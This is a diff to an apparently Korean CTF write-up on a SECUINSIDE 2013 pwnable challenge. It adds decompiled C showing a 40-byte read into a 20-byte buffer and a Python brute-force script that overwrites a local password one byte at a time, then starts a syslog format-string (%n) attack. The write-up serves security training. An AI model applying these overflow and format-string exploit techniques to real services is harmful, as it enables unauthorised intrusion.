@@ -4,7 +4,7 @@ date = "2024-07-19"
 description = "SECUINSIDE CTF 2013 pwnable challenge"
 
 [taxonomies]
-tags = ["ctf", "pwnable", "info leak", "fsb", "syslog"]
+tags = ["ctf", "pwnable", "bof", "byte by byte attack", "fsb", "syslog"]
 +++
 
 ## 0x00. Introduction
@@ -19,7 +19,7 @@ tags = ["ctf", "pwnable", "info leak", "fsb", "syslog"]
 
 
 ## 0x01. Vulnerability
-### Info Leak
+### Buffer Overflow
 ``` c
 int main()
 {
@@ -60,9 +60,7 @@ int read_password_8048A7D()
 }
 ```
 
-`read_password_8048A7D()`를 보면 `read()`에서 40바이트를 읽으며 지역변수 `password`의 값을 조작할 수 있지만, `lock()`이나 `unlock()`에서는 전역변수 `password_804A0A4`의 값과 비교하기 때문에 의미가 없다.
-
-대신 다른 공격이 가능한데, `password`의 마지막 1바이트를 남겨놓고 앞 부분은 `buf`와 같은 값으로 덮으면 1바이트씩 brute forcing이 가능하다.
+이 때 20바이트짜리 `buf`에 40바이트만큼 입력을 받기 때문에 지역변수 `password`를 덮을 수 있다.
 
 ### FSB in `syslog`
 ``` c
@@ -101,6 +99,61 @@ void syslog(int priority, const char *format, ...);
 
 
 ## 0x02. Exploit
+### Info Leak
+``` c
+int read_password_8048A7D()
+{
+  FILE *fd; // [esp+10h] [ebp-38h]
+  char buf[20]; // [esp+14h] [ebp-34h] BYREF
+  char password[20]; // [esp+28h] [ebp-20h] BYREF
+  int canary; // [esp+3c] [ebp-c]
+
+  *&password[20] = __readgsdword(0x14u);
+  fd = fopen("password", "rb");
+  fread(password, 1u, 0x10u, fd);
+  fclose(fd);
+  *password_804A0A4 = *password;
+  *&password_804A0A4[4] = *&password[4];
+  *&password_804A0A4[8] = *&password[8];
+  *&password_804A0A4[12] = *&password[12];
+  printf("Input master key > ");
+  read(0, buf, 40u);
+  return memcmp(password, buf, 16u);
+}
+```
+
+`read_password_8048A7D()`를 보면 `read()`에서 40바이트를 읽으며 지역변수 `password`의 값을 조작할 수 있지만, `lock()`이나 `unlock()`에서는 전역변수 `password_804A0A4`의 값과 비교하기 때문에 의미가 없다.
+
+대신 다른 공격이 가능한데, `password`의 마지막 1바이트를 남겨놓고 앞 부분은 `buf`와 같은 값으로 덮으면 1바이트씩 brute forcing이 가능하다.
+
+따라서 다음과 같이 payload를 작성했다.
+
+``` python
+def guess_key(s):
+    key = []
+    for i in range(16):
+        for j in range(256):
+            s = remote("0.0.0.0", 8107)
+            floor_and_room(s, 1, 2)
+            payload = b"A" * (16 - len(key) - 1)
+            payload += chr(j).encode()
+            payload += ''.join(key).encode()
+            payload += b"B" * 4
+            payload += b"A" * (16 - len(key) - 1)
+            s.send(payload)
+            try:
+                if s.recv():
+                    key.insert(0, chr(j))
+                    log.success(f"HIT : {key}")
+                    s.close()
+                    break
+            except:
+                s.close()
+                continue
+    return key
+```
+
+### FSB
 평소처럼 FSB를 활용하려면 payload를 `%p %p %p %p ...` 이런 식으로 구성해서 몇 번째 format string부터 `$esp`가 가리키는 부분인지 확인한다.
 하지만 `syslog()`는 `/var/log/syslog`에 로그를 남길 뿐이라서 결과를 확인할 수가 없었다.
 결국 `%?$n`에서 `?`값을 늘려가며 언제 어디에 값이 써지는지 손으로 퍼징을 했다.
